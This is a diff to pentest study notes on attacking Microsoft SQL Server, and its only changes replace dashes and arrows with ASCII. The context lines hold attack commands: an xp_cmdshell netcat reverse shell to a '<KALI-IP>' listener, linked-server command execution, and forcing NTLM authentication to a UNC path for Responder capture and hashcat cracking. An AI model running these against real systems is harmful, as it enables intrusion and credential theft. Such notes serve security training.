@@ -1,6 +1,6 @@
 # MSSQL Attacks
 
-Microsoft SQL Server runs on port **1433** by default. Very common on Windows boxes. The key attack is getting `xp_cmdshell` working — it lets you run OS commands directly from SQL queries, giving you RCE.
+Microsoft SQL Server runs on port **1433** by default. Very common on Windows boxes. The key attack is getting `xp_cmdshell` working - it lets you run OS commands directly from SQL queries, giving you RCE.
 
 ---
 
@@ -79,7 +79,7 @@ SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'
 
 ---
 
-## xp_cmdshell — OS Command Execution
+## xp_cmdshell - OS Command Execution
 
 `xp_cmdshell` runs OS commands as the SQL Server service account (often SYSTEM or a privileged account).
 
@@ -118,7 +118,7 @@ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <KALI-IP> 4444'
 ```
 
 ```sh
-# On Kali — listener first
+# On Kali - listener first
 nc -lvnp 4444
 ```
 
@@ -150,7 +150,7 @@ EXEC xp_cmdshell 'whoami'
 
 ## Linked Servers
 
-MSSQL servers can be linked — you query one server and it executes on another. If the link uses a privileged account on the remote server, you can pivot.
+MSSQL servers can be linked - you query one server and it executes on another. If the link uses a privileged account on the remote server, you can pivot.
 
 ```sql
 -- List linked servers
@@ -169,7 +169,7 @@ EXEC ('xp_cmdshell ''whoami''') AT [<linked-server>]
 
 ## UNC Path Hash Capture
 
-MSSQL can be tricked into authenticating to a UNC path — Responder captures the hash.
+MSSQL can be tricked into authenticating to a UNC path - Responder captures the hash.
 
 ```sql
 -- Trigger NTLM auth to Responder
@@ -178,9 +178,9 @@ EXEC xp_fileexist '\\<KALI-IP>\share\test'
 ```
 
 ```sh
-# On Kali — Responder running
+# On Kali - Responder running
 sudo responder -I eth0 -dPv
-# Hash appears → crack with hashcat -m 5600
+# Hash appears -> crack with hashcat -m 5600
 ```
 
 ---
